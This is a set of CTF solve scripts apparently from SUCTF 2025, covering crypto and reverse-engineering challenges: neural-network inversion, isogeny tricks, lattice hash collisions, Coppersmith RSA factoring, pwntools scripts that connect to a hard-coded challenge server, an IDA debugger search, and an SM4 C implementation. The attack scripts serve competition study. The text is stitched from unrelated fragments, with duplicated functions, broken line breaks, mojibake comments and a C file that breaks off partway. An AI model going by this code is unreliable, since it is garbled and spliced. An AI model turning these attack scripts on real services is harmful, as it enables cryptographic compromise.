    Gz = jacobian_multiply((Gx, Gy, 1), (N - z) % N)
    XY = jacobian_multiply((x, y, 1), s)
    Qr = jacobian_add(Gz, XY)
    Q = jacobian_multiply(Qr, inv(r, N))
    Q = from_jacobian(Q)

    return Q
import torch
import torch.nn as nn
flag=''
flag_list=[]
for i in flag:
    binary_str = format(ord(i), '09b')
    print(binary_str)
    for bit in binary_str:
        flag_list.append(int(bit))
input=torch.tensor(flag_list, dtype=torch.float32)
n=len(flag)
class Net(nn.Module):

    def __init__(self):
        super(Net, self).__init__()
        self.linear = nn.Linear(n, n*n)
        self.conv=nn.Conv2d(1, 1, (2, 2), stride=1,padding=1)
        self.conv1=nn.Conv2d(1, 1, (3, 3), stride=3)

    def forward(self, x):
        x = x.view(1,1,3, 3*n)
        x = self.conv1(x)
        x = x.view(n)
        x = self.linear(x)
        x = x.view(1, 1, n, n)
        x=self.conv(x)
        return x
mynet=Net()
mynet.load_state_dict(torch.load('model.pth'))
output=mynet(input)
with open('ciphertext.txt', 'w') as f:
    for tensor in output:
        for channel in tensor:
            for row in channel:
                f.write(' '.join(map(str, row.tolist())))
                f.write('n')
for key, value in state_dict.items():
    print(f"{key}: {value.shape}")
def reverse_convolution_2x2(y, weight, bias):
    """
    根据已知输出 y、卷积核 weight (2x2) 和偏置 bias，
    在假设 stride=1, padding=1, kernel_size=(2,2) 且外圈补0 的情况下，
    逐元素解出原始输入（带padding的一大圈）的数组 X。

    y:      2D numpy array, 形状 (49, 49)
    weight: 2x2 numpy array, e.g. [[7, -5], [9, -7]]
    bias:   float, e.g. -7

    返回值:
        X: 2D numpy array, 形状 (50, 50)，其中 X[1:49, 1:49] 为卷积前的实际数据。
    """
    h, w = y.shape
    # 我们创建一个 (h+1) x (w+1) 的零矩阵，用来存放解出的 X
    X = np.zeros((h + 1, w + 1), dtype=np.float64)

    # 提取卷积核
    w00, w01 = weight[0, 0], weight[0, 1]
    w10, w11 = weight[1, 0], weight[1, 1]

    for i in range(h):  # i: 0~48
        for j in range(w):  # j: 0~48
            # Y[i,j] = (X[i,j]*w00 + X[i,j+1]*w01
            #          + X[i+1,j]*w10 + X[i+1,j+1]*w11) + bias
            #
            # 其中 X[i,j], X[i,j+1], X[i+1,j] 已经在之前行列的循环中被解/或为0(若在padding外)
            # 剩下 X[i+1,j+1] 这一项没有解，我们用它来“反推出”。

            partial_sum = (X[i, j] * w00 +
                           X[i, j + 1] * w01 +
                           X[i + 1, j] * w10)

            X[i + 1, j + 1] = (y[i, j] - bias - partial_sum) / w11

    return X
def inverse_linear_layer(
        Y_after_48x48: np.ndarray,
        weight: np.ndarray,
        bias: np.ndarray,
        method: str = "matrix_multiply"
):
    """
    逆向线性层：
      1) 将 48x48 的输出矩阵展开为 (1,2304) 向量 Y
      2) 逐元素减去偏置 bias (1,2304)
      3) 根据指定 method 计算输入 x (1,48)
         - "matrix_multiply":  (Y - bias) @ W
         - "subset_solve":     从 W 的 2304 行中选 48 行, 与 (Y - bias) 的同样 48 个元素做 solve

    参数：
      Y_after_48x48: 最终得到的 48x48 矩阵 (numpy array)
      weight:        线性层的权重, 形状 (2304, 48)
      bias:          线性层的偏置, 形状 (1, 2304)
      method:        逆向求解的方法，"matrix_multiply" 或 "subset_solve"

    返回：
      x: 形状 (1,48) 的 numpy array，表示线性层的输入
    """

    # 1. 确保输入类型为 NumPy 数组
    if not isinstance(Y_after_48x48, np.ndarray):
        Y_after_48x48 = np.array(Y_after_48x48)
    if not isinstance(weight, np.ndarray):
        weight = np.array(weight)
    if not isinstance(bias, np.ndarray):
        bias = np.array(bias)

    # 2. 打印形状以调试
    print(f"Y_after_48x48 shape: {Y_after_48x48.shape}")
    print(f"Weight shape: {weight.shape}")
    print(f"Bias shape: {bias.shape}")

    # 3. 展平 Y
    Y_flat = Y_after_48x48.flatten()  # shape (2304,)
    print(f"Y_flat shape: {Y_flat.shape}")

    # 4. 确保 bias 是一维向量
    if bias.ndim == 2:
        bias_flat = bias.flatten()
    else:
        bias_flat = bias
    print(f"Bias_flat shape: {bias_flat.shape}")

    # 5. 减去偏置
    Y_no_bias = Y_flat - bias_flat  # shape (2304,)
    print(f"Y_no_bias shape: {Y_no_bias.shape}")

    # 6. 检查权重矩阵和 Y_no_bias 的形状是否匹配
    if weight.shape[0] != Y_no_bias.shape[0]:
        print(f"权重矩阵的行数 ({weight.shape[0]}) 与 Y_no_bias 的长度 ({Y_no_bias.shape[0]}) 不匹配。")
        return None

    # 7. 检查权重矩阵的秩
    rank = np.linalg.matrix_rank(weight)
    print(f"Weight matrix rank: {rank} (期望: 48)")
    if rank < 48:
        print("警告: 权重矩阵的秩小于 48，可能导致逆向求解不准确。")

    # 8. 使用最小二乘法求解 x
    try:
        x, residuals, rank, s = np.linalg.lstsq(weight, Y_no_bias, rcond=None)
    
except np.linalg.LinAlgError as e:
        print("线性代数错误:", e)
        return None

    print(f"Recovered x shape: {x.shape}")
    return x
def reconstruct_patches(f_list, kernel, bias):
    """
    根据卷积输出 f_list、卷积核 kernel 和偏置 bias 逆向重构输入补丁。

    参数：
    - f_list: list 或 np.array，卷积输出值列表
    - kernel: 3x3 np.array，卷积核（未直接使用，因为权重系数已被用来解方程）
    - bias: int，偏置值

    返回：
    - patches: list of 3x3 np.array，重构的输入补丁
    """
    patches = []
    for idx, f_i in enumerate(f_list):
        y = f_i - bias
        if y < 0 or y > 511:
            print(f"警告: f[{idx}]={f_i} 导致 y={y} 不在有效范围 [0,511] 内")
            # 无效的值，补零或处理异常
            patches.append(np.zeros((3,3), dtype=int))
            continue
        # 将 y 转换为9位二进制字符串
        binary_str = format(y, '09b')  # '000000000' 到 '111111111'
        # 反转字符串，LSB 到 MSB
        binary_str_reversed = binary_str[::-1]
        # 获取 x1 到 x9
        x = [int(bit) for bit in binary_str_reversed]
        # 重构3x3补丁
        patch = np.array(x).reshape(3,3)
        patches.append(patch)
    return patches

def assemble_input_matrix(patches, input_shape=(3,144), stride=3, kernel_size=(3,3)):
    """
    将输入补丁组装回原始输入矩阵。

    参数：
    - patches: list of 3x3 np.array，重构的输入补丁
    - input_shape: tuple, 输入矩阵形状 (H, W)
    - stride: int, 卷积步幅
    - kernel_size: tuple, 卷积核大小 (kH, kW)

    返回：
    - input_matrix: np.array, 原始输入矩阵，值为0或1
    """
    H, W = input_shape
    kH, kW = kernel_size
    s = stride
    H_out = (H - kH) // s + 1
    W_out = (W - kW) // s + 1
    expected_patches = H_out * W_out

    if len(patches) != expected_patches:
        print(f"警告: 期望的补丁数量为 {expected_patches}, 但实际补丁数量为 {len(patches)}")
        # 根据实际情况处理，例如填充或截断
        if len(patches) < expected_patches:
            # 填充缺失的补丁为零
            for _ in range(expected_patches - len(patches)):
                patches.append(np.zeros((3,3), dtype=int))
        else:
            # 截断多余的补丁
            patches = patches[:
expected_patches]

    # 初始化输入矩阵
    input_matrix = np.zeros(input_shape, dtype=int)

    patch_idx = 0
    for i in range(H_out):
        for j in range(W_out):
            patch = patches[patch_idx]
            row_start = i * s
            col_start = j * s
            input_matrix[row_start:
row_start +kH, col_start:
col_start +kW] = patch
            patch_idx +=1

    return input_matrix
def decrypt_flag(flag_list):
    """
    根据二进制位列表解密出原始 flag 字符串。

    参数：
        flag_list: 包含二进制位的列表，每 9 位代表一个字符。

    返回：
        原始的 flag 字符串。
    """
    # 检查 flag_list 是否是 9 的倍数
    if len(flag_list) % 9 != 0:
        raise ValueError("flag_list 的长度必须是 9 的倍数")

    # 初始化解密后的字符串
    flag = ""

    # 每 9 位为一组，恢复字符
    for i in range(0, len(flag_list), 9):
        # 提取 9 位
        binary_segment = flag_list[i:i + 9]
        # 将 9 位二进制转为字符串形式的二进制
        binary_str = ''.join(map(str, binary_segment))
        # 将二进制字符串转换为 ASCII 值（整数）
        ascii_value = int(binary_str, 2)
        # 转换为字符并拼接到结果字符串
        flag += chr(ascii_value)

    return flag
import numpy as np

def inverse_linear_layer(
Y_after_48x48: np.ndarray,
weight: np.ndarray,
bias: np.ndarray,
method: str = "matrix_multiply"
):
"""
逆向线性层：
1) 将 48x48 的输出矩阵展开为 (1,2304) 向量 Y
2) 逐元素减去偏置 bias (1,2304)
3) 根据指定 method 计算输入 x (1,48)
- "matrix_multiply":  (Y - bias) @ W
- "subset_solve":     从 W 的 2304 行中选 48 行, 与 (Y - bias) 的同样 48 个元素做 solve

参数：
Y_after_48x48: 最终得到的 48x48 矩阵 (numpy array)
weight:        线性层的权重, 形状 (2304, 48)
bias:          线性层的偏置, 形状 (1, 2304)
method:        逆向求解的方法，"matrix_multiply" 或 "subset_solve"

返回：
x: 形状 (1,48) 的 numpy array，表示线性层的输入
"""

# 1. 确保输入类型为 NumPy 数组
if not isinstance(Y_after_48x48, np.ndarray):
Y_after_48x48 = np.array(Y_after_48x48)
if not isinstance(weight, np.ndarray):
weight = np.array(weight)
if not isinstance(bias, np.ndarray):
bias = np.array(bias)

# 2. 打印形状以调试
print(f"Y_after_48x48 shape: {Y_after_48x48.shape}")
print(f"Weight shape: {weight.shape}")
print(f"Bias shape: {bias.shape}")

# 3. 展平 Y
Y_flat = Y_after_48x48.flatten()  # shape (2304,)
print(f"Y_flat shape: {Y_flat.shape}")

# 4. 确保 bias 是一维向量
……
# https://magicfrank00.github.io/writeups/writeups/alpacahack2024/a-dance-of-add-and-mul/
import libnum
p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab
K = GF(p)
E = EllipticCurve(K, (0, 4))
o = 793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289
n1, n2 = 859267, 52437899
E.random_element()
cs = ...
flag = ''
tmp = 923437523760618658131300225986997133705973440106967859884393719150179692206291737454580267
n1, n2 = 859267, 52437899
r = o//(10177)

    
tt = '2558028070049345735599966692238165043970552021669288124924862764282615075181952619645122358179074609427643871393283'
flag = ''

for c in cs:
    c = E(c) * r
    tmp = str(E.isogeny(c))
    if tt in str(tmp):
        flag += '0'
    else:
        flag += '1'
    if len(flag)%8==0:
        m = int(flag,2)
        m = libnum.n2s(m)
        print(m)
# SUCTF{We1come__T0__SUCTF__2025}
import os
import sys
from unittest import TestCase

path = os.path.dirname(os.path.dirname(os.path.realpath(os.path.abspath(__file__))))
if sys.path[1] != path:
    sys.path.insert(1, path)

from attacks.pseudoprimes import miller_rabin

class Pseudoprimes(TestCase):
    def _miller_rabin(self, n, bases):
        assert n > 3
        r = 0
        d = n - 1
        while d % 2 == 0:
            r += 1
            d //= 2

        for a in bases:
            x = pow(a, d, n)
            if x == 1 or x == n - 1:
                continue
            for _ in range(r - 1):
                x = pow(x, 2, n)
                if x == n - 1:
                    break
            else:
                return False
        return True

    def test_miller_rabin(self):
        bases = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31]
        n, p1, p2, p3 = miller_rabin.generate_pseudoprime(bases, min_bit_length=400)
        self.assertIsInstance(n, int)
        self.assertIsInstance(p1, int)
        self.assertIsInstance(p2, int)
        self.assertIsInstance(p3, int)
        self.assertGreaterEqual(n.bit_length(), 400)
        self.assertEqual(n, p1 * p2 * p3)
        self.assertTrue(self._miller_rabin(n, bases))

        bases = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61]
        n, p1, p2, p3 = miller_rabin.generate_pseudoprime(bases, min_bit_length=600)
        self.assertIsInstance(n, int)
        self.assertIsInstance(p1, int)
        self.assertIsInstance(p2, int)
        self.assertIsInstance(p3, int)
        self.assertGreaterEqual(n.bit_length(), 600)
        self.assertEqual(n, p1 * p2 * p3)
        self.assertTrue(self._miller_rabin(n, bases))
# sage
def solve(n, N=1, check=True):  # count N groups
  R.<x, y, z> = QQ[]
  f = x^3+y^3+z^3-(n-1)*x^2*(y+z)-(n-1)*y^2*(x+z)-(n-1)*z^2*(x+y)-(2*n-3)*x*y*z
  tran = EllipticCurve_from_cubic(f, None, true)
  tran_inv = tran.inverse()
  EC = tran.codomain()
  g = EC.gens()[0]
  P = g

  count = 0
  while count<3:
    Pinv = tran_inv(P)
    _x = Pinv[0].numerator()
    _y = Pinv[1].numerator()
    _z = Pinv[0].denominator()
    if _x>0 and _y>0:
      print('x = %d' % _x)
      print('y = %d' % _y)
      print('z = %d' % _z)
      if check: print('check: '+str(f([_x, _y, _z])==0))
      print('')
      count = count+1
    P = P+g

solve(4)
from pwn import *
import hashlib
from itertools import *
from string import *
# context.log_level = 'debug'

# import socketserver
# import signal
from Crypto.Util.number import *
from random import randint
import time
from sage.geometry.hyperbolic_space.hyperbolic_isometry import moebius_transform
# from secret import flag

def nc(data):
    if ':' in data:
        sym = ':'
    else:
        sym = ' '
    address = data.split(sym)[-2]
    port = int(data.split(sym)[-1].strip())
    print('地址:', address)
    print('端口:', port)
    sh = remote(address, port)
    return sh

# 直接粘贴题目给的靶机地址、端口
data = 'nc 1.95.46.185 10001'
sh = nc(data)

"""在下面开始编程，与服务器进行交互"""
g1 = 1039060312974897338070170130946226525072449352944784385585541004615179695645225157
sh.recvuntil(b'[+] Plz Tell Me your number: ')
sh.sendline(str(g1).encode())
x = 1440354387400113353318275132419054375891245413681864837390427511212805748408072838847944629793120889446685643108530381465382074956451566809039119353657601240377236701038904980199109550001860607309184336719930229935342817546146083848277758428344831968440238907935894338978800768226766379
y = 1054210182683112310528012408530531909717229064191793536540847847817849001214642792626066010344383473173101972948978951703027097154519698536728956323881063669558925110120619283730835864056709609662983759100063333396875182094245046315497525532634764115913236450532733839386139526489824351
z = 9391500403903773267688655787670246245493629218171544262747638036518222364768797479813561509116827252710188014736501391120827705790025300419608858224262849244058466770043809014864245428958116544162335497194996709759345801074510016208346248254582570123358164225821298549533282498545808644

g2 = f'{x},{y},{z}'.encode()
print(g2)
sh.recvuntil(b'[+] Plz give Me your a, b, c:')
sh.sendline(g2)

print(int(time.time()))

set_random_seed(int(time.time()))
C = ComplexField(999)
M = random_matrix(CC, 2, 2)
Trans = lambda z: moebius_transform(M, z)

out = []
for _ in range(3):
    x = C.random_element()
    out.append((x,Trans(x)))

kx = C.random_element()
print('kx =', kx)
C2 = ComplexField(50)

ans = C(Trans(kx))
# print(C2(ans))
# print(C2(Trans(kx)))

sh.recvuntil(b'Plz Tell Me your answer:')
sh.sendline(str(ans).encode())
sh.recvline()
sh.recvline()
sh.recvline()
sh.interactive()
# SUCTF{Hope_Y0u_have_a_NICE_tr1p_in_SUCTF~}
from Crypto.Util.number import *
from random import getrandbits
from hashlib import md5 as md5
import subprocess
from tempfile import TemporaryDirectory
import os, pickle
from tqdm import trange
from sage.all import *
from binteger import Bin
from pwn import *
import hashlib
from itertools import *
from string import *
context.log_level = 'debug'

class myhash:
        def __init__(self, n):
            self.g = 91289086035117540959154051117940771730039965839291520308840839624996039016929
            self.n = n

        def update(self, msg: bytes):
            for i in range(len(msg)):
                self.n = self.g * (2 * self.n + msg[i])
                self.n = self.n & ((1 << 383) - 1)

        def digest(self) -> bytes:
            return int((self.n - 0xd1ef3ad53f187cc5488d19045) % (1 << 128)).to_bytes(16, "big")
        
def xor(x, y):
    x = b'x00' * (16 - len(x)) + x
    y = b'x00' * (16 - len(y)) + y
    return long_to_bytes(bytes_to_long(bytes([a ^^ b for a, b in zip(x, y)])))

def fn(msg, n0):
    h = myhash(n0)
    ret = bytes([0] * 16)
    for b in msg:
        h.update(bytes([b]))
        d = h.digest()
        ret = xor(ret, d)
    return ret

def attack_hash(n0:
int, var_len:
int, Hash:
bytes): # 给定n0, 字符串长度，目标Hash值，反求出消息
    xs = [var(f"x{i+1}") for i in range(var_len)]
    ms = [xs[i] + 128 for i in range(var_len)]
    g = 91289086035117540959154051117940771730039965839291520308840839624996039016929
    a = 0xd1ef3ad53f187cc5488d19045
    n = n0
    for i in range(var_len):
        n = g*(2*n + ms[i])

    coff_list= [pow(2,128)]
    tmp_equ = str(n).split(' + ')
    for i in range(var_len):
        for each in tmp_equ:
            if f'x{i+1}' in each:
                tmp = int(each.split('*')[0]) % pow(2, 128)
                coff_list.append(tmp)
                break

    coff_list.append(int(tmp_equ[-1]))

    D = bytes_to_long(Hash) # 目标哈希
    coff_list[-1] = coff_list[-1]-a-D

    M = matrix(var_len+2,var_len+2)
    for i in range(var_len+2):
        M[i, 0] = coff_list[i]
        if i>=1:
            M[i, i] = 1

    M = M.LLL()
    for line in M:
        if line[0] == 0 and line[-1]==1:
            ans = [i+128 for i in line[1:-1]]
            return bytes(ans)
    return None

# 以相同hash摘要为目标的碰撞
def fastcoll(n0, prefix=b""):  # 给定前缀下（可空），碰撞出两个有相同hash的不同消息
    if prefix:
        h = myhash(n0)
        h.update(prefix)
        n0 = h.n  # 更新n0
    i = 40
    ms = []
    tmphash = long_to_bytes(getrandbits(128))
    while len(ms) <2:
        tmp = attack_hash(n0, var_len=i, Hash=tmphash)
        if tmp:
            ms.append(tmp)
        i += 1
    return ms

def myhexdigest(n0, msg):
    h = myhash(n0)
    for b in msg:
        h.update(bytes([b]))
        d = h.digest()
    return d.hex()

def byt2bv(b, n):
    return vector(GF(2), Bin(b, n=n).list)

def bv2byt(b):
    return Bin(b).bytes

def nc(data):
    if ':' in data:
        sym = ':'
    else:
        sym = ' '
    address = data.split(sym)[-2]
    port = int(data.split(sym)[-1].strip())
    print('地址:', address)
    print('端口:', port)
    sh = remote(address, port)
    return sh

# Proof of Work
def PoW(sh):
    proof = sh.recvline_contains(b'XXXX').decode().split('sha256')[-1]  # 接收数据sha256相关数据
    Xnum = proof.split('+')[0].upper().count("X")
    tail = proof.split('+')[1].split(')')[0].strip()
    _hash = proof.split('==')[-1].strip()
    print(proof)
    sh.recvuntil(b'XXXX')  # 接收待输入指令
    if 'n' in _hash:
        _hash = _hash.split('n')[0]
    print("未知数：", Xnum)
    print(tail)
    print(_hash)
    print('开始爆破！')
    table = ascii_letters + digits  # 爆破字符表
    for i in product(table, repeat=Xnum):
        head = ''.join(i)
        t = hashlib.sha256((head + tail).encode()).hexdigest()
        if t == _hash:
            print('爆破成功！结果是：', end='')
            print(head)
            sh.sendline(head.encode())
            return head

# 直接粘贴题目给的靶机地址、端口
data = 'nc 1.95.46.185 10007'
sh = nc(data)
"""在下面开始编程，与服务器进行交互"""
PoW(sh)
test_n0 = int(sh.recvline_contains(b'n0 = ').split(b' = ')[-1])
print('test_n0 =', test_n0)

ms = []
xs = []
prev = b""
for _ in range(129):
    print(len(prev))
    ma, mb = fastcoll(n0=test_n0, prefix=prev)
    ms.append((ma, mb))
    x = xor(fn(prev + ma, test_n0), fn(prev + mb, test_n0))
    xs.append(x)
    prev += ma

print('done')

cur = byt2bv(fn(b"".join([ma for ma, mb in ms]), test_n0), 128)
mat = matrix(GF(2), [byt2bv(x, 128) for x in xs])
print(mat.rank())
# assert mat.rank() == 128
target = byt2bv(b'justjusthashhash', 128)
# cur+?*mat=target
sol = mat.solve_left(target - cur)
print(sol)
msg = b""
for v, ma, mb in zip(sol, *zip(*ms)):
    if v == 0:
        msg += ma
    else:
        msg += mb

msg = msg.hex()
print('find msg')

# 服务器端n固定，直接提交msg即可
data = 'nc 1.95.46.185 10007'
sh = nc(data)
"""在下面开始编程，与服务器进行交互"""
PoW(sh)
sh.recvuntil(b'give me your msg ->')
sh.sendline(msg.encode())
sh.recvline()
sh.recvline()
sh.interactive() # SUCTF{5imple_st4te_Tran3fer_w1th_s1m1lar_to_md5!!!!!}
from tqdm import trange
from Crypto.Util.number import inverse
from multiprocessing import Pool
from hashlib import sha256
import gmpy2

d_m =  54846367460362174332079522877510670032871200032162046677317492493462931044216323394426650814743565762481796045534803612751698364585822047676578654787832771646295054609274740117061370718708622855577527177104905114099420613343527343145928755498638387667064228376160623881856439218281811203793522182599504560128
n =  102371500687797342407596664857291734254917985018214775746292433509077140372871717687125679767929573899320192533126974567980143105445007878861163511159294802350697707435107548927953839625147773016776671583898492755338444338394630801056367836711191009369960379855825277626760709076218114602209903833128735441623
e =  112238903025225752449505695131644979150784442753977451850362059850426421356123

# 计算 k
k = (e*d_m) // n + 1

# 计算p mod e的值
k_inv = inverse(k,e)
s = (n + 1 + k_inv) % e
R.<x> = PolynomialRing(Zmod(e))
f = x^2 - s*x + n
res = f.roots()
may_p_mod_e = [int(res[0][0]),int(res[1][0])]

def attack(range):
    low = range[0]
    up = range[1]
    for pl in may_p_mod_e:
        R.<x> = PolynomialRing(Zmod(n))
        for i in trange(low,up):
            f = (x * 2^14 + i) * e + pl
            res = f.monic().small_roots(X=2^242,beta=0.49,epsilon=0.02)
            if res != []:
                print(f"res = {res}")
                print(f"i = {i}")
            for root in res:
                p = (int(root) * 2^14 + i) * e + pl
                if n % p == 0:
                    flag1 = "SUCTF{" + sha256(str(p).encode()).hexdigest()[:32] + "}"
                    flag2 = "SUCTF{" + sha256(str(n // p).encode()).hexdigest()[:32] + "}"
                    print(flag1)
                    print(flag2)
                    return 
                
ranges = [(i,i + 512) for i in range(0,2^14,512)]

with Pool(32) as pool:  
    r = list(pool.imap(attack,ranges))
from idaapi import *

origin_status=get_qword(0x63F530)
final_status=get_qword(0x63F538)

# 获取相关数据的地址 
rbp=get_reg_val('rbp')
input_addr=rbp-0x40
i_addr=rbp-0x48
status_addr=rbp-0x50
path=get_qword(input_addr)
# 路径数组
flag=''
isVisited=dict()
# 存储状态被访问的情况,防止走回头路

def get_status():
    return get_qword(status_addr)

def set_status(status):
    patch_qword(status_addr,status)

def get_i():
    return get_qword(i_addr)
def set_i(i):
    patch_qword(i_addr,i)

def get_code(pos):
    return get_byte(path+pos)

def set_code(off,code):
    patch_byte(path+off,ord(code))

# 判断指定状态向指定方向移动后的状态
def run_is_legal(status, code):
    # 设置初始状态
    set_status(status)
    set_code(0,code)
    set_i(0) # 无限循环

    # 运行,获取新状态
    continue_process()
    wait_for_next_event(WFNE_SUSP,-1)
# 等待下一个调试事件
    new_status=get_status()
# 获取新的状态
    
    print(f'code:{code} new_status:{hex(new_status)}')
    return new_status

# 搜索指定状态的路径,DFS深搜
def search(status):
    global flag
    global isVisited
    print("search status:",hex(status))
    if status==final_status:
        return True
    if status in isVisited:
        return False
    else:
        isVisited[status]=True

    new_status=run_is_legal(status, 'w')
    if new_status!=origin_status and new_status!=status:
        if search(new_status):
            flag+='w'
            return True

    new_status=run_is_legal(status, 'd')
    if new_status!=origin_status and new_status!=status:
        if search(new_status):
            flag+='d'
            return True

    new_status=run_is_legal(status, 's')
    if new_status!=origin_status and new_status!=status:
        if search(new_status):
            flag+='s'
            return True

    new_status=run_is_legal(status, 'a')
    if new_status!=origin_status and new_status!=status:
        if search(new_status):
            flag+='a'
            return True
    return False

print(f'original status:{hex(origin_status)},final_status:{hex(final_status)}')
search(origin_status)
print("flag:",flag[::-1])
# 递归需要倒序flag才是正确结果
ddssaassddddssddssssaassaawwwwwwaassssssssssddssssssddwwddddssssddssssddwwwwddssddwwddssddwwwwwwwwwwaawwaawwddwwaaaawwwwddwwddssddddddssaassaassddssddwwddwwwwwwwwwwwwddssssssssssddddssssssddwwwwwwddssddssaassssddssssaaaawwwwaassssaawwaassssssddddssssddssssssaassdddddd
void four_uCh2uLong(u8 *in, u32 *out);             //锟斤拷锟街斤拷转锟斤拷锟斤拷u32
void uLong2four_uCh(u32 in, u8 *out);
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>

    #define u8 unsigned char
    #define u32 unsigned long

void four_uCh2uLong(u8 *in, u32 *out);             //锟斤拷锟街斤拷转锟斤拷锟斤拷u32

void uLong2four_uCh(u32 in, u8 *out);              //u32转锟斤拷锟斤拷锟斤拷锟街斤拷

unsigned long move(u32 data, int length);          //锟斤拷锟狡ｏ拷锟斤拷锟斤拷锟斤拷锟斤拷位锟斤拷锟斤拷尾锟斤拷

unsigned long func_key(u32 input);                 //锟斤拷使锟斤拷Sbox锟斤拷锟叫凤拷锟斤拷锟皆变化锟斤拷锟劫斤拷锟斤拷锟皆变换L锟矫伙拷为L'

unsigned long func_data(u32 input);                //锟斤拷使锟斤拷Sbox锟斤拷锟叫凤拷锟斤拷锟皆变化锟斤拷锟劫斤拷锟斤拷锟斤拷锟皆变换L

void print_hex(u8 *data, int len);                 //锟睫凤拷锟斤拷锟街凤拷锟斤拷锟斤拷转16锟斤拷锟狡达拷印

void encode_fun(u8 len,u8 *key, u8 *input, u8 *output);   //锟斤拷锟杰猴拷锟斤拷

void decode_fun(u8 len,u8 *key, u8 *input, u8 *output);   //锟斤拷锟杰猴拷锟斤拷

/******************************锟斤拷锟斤拷系统锟斤拷锟斤拷FK锟斤拷取值****************************************/
const u32 TBL_SYS_PARAMS[4] = {
    0xa3b1bac6,
    0x56aa3350,
    0x677d9197,
    0xb27022dc
};

/******************************锟斤拷锟斤拷潭锟斤拷锟斤拷锟紺K锟斤拷取值****************************************/
const u32 TBL_FIX_PARAMS[32] = {

    0x00070e15,0x1c232a31,0x383f464d,0x545b6269,
    0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,
    0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,
    0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,
    0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,
    0x30373e45,0x4c535a61,0x686f767d,0x848b9299,
    0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,
    0x10171e25,0x2c333a41,0x484f565d,0x646b7279
};

/******************************SBox锟斤拷锟斤拷锟叫憋拷****************************************/
const u8 TBL_SBOX[256] = {

    0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,
    0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,
    0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,
    0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,
    0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,
    0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,
    0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,
    0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,
    0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,
    0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,
    0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,
    0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,
    0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,
    0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,
    0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,
    0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48
};

void four_uCh2uLong1(u8 *in, u32 *out)
{
    int i = 0;
    *out = 0;
    for (i = 0; i < 4; i++)
        *out = ((u32)in[i] << (24 - i * 8)) ^ *out;
    //*out = (*out>>8)|(*out<<32-8);
}

void uLong2four_uCh1(u32 in, u8 *out)
{
    int i = 0;
    //浠?2浣島nsigned long鐨勯珮浣嶅紑濮嬪彇
    for (i = 0; i < 4; i++)
        *(out + i) = (u32)(in >> (24 - i * 8));
    //u8 tmp = out[0];
    //for (i = 0; i < 4; i++)
    //    *(out + i) = *(out + (i+1)%4);
    //out[3] = tmp;
}

void four_uCh2uLong(u8 *in, u32 *out)
{
    int i = 0;
    *out = 0;
    for (i = 0; i < 4; i++)
        *out = ((u32)in[i] << (24 - i * 8)) ^ *out;
    *out = (*out>>8)|(*out<<32-8);
}

void uLong2four_uCh(u32 in, u8 *out)
{
    int i = 0;
    //浠?2浣島nsigned long鐨勯珮浣嶅紑濮嬪彇
    for (i = 0; i < 4; i++)
        *(out + i) = (u32)(in >> (24 - i * 8));
    u8 tmp = out[0];
    for (i = 0; i < 4; i++)
        *(out + i) = *(out + (i+1)%4);
    out[3] = tmp;
}

//锟斤拷锟狡ｏ拷锟斤拷锟斤拷锟斤拷锟斤拷位锟斤拷锟斤拷尾锟斤拷
u32 move(u32 data, int length)
{
    u32 result = 0;
    result = (data << length) ^ (data >> (32 - length));

    return result;
}

//锟斤拷钥锟斤拷锟斤拷锟斤拷锟斤拷,锟斤拷使锟斤拷Sbox锟斤拷锟叫凤拷锟斤拷锟皆变化锟斤拷锟劫斤拷锟斤拷锟皆变换L锟矫伙拷为L'
u32 func_key(u32 input)
{
    int i = 0;
    u32 ulTmp = 0;
    u8 ucIndexList[4] = { 0 };
    u8 ucSboxValueList[4] = { 0 };
    uLong2four_uCh(input, ucIndexList);
    for (i = 0; i < 4; i++)
    {
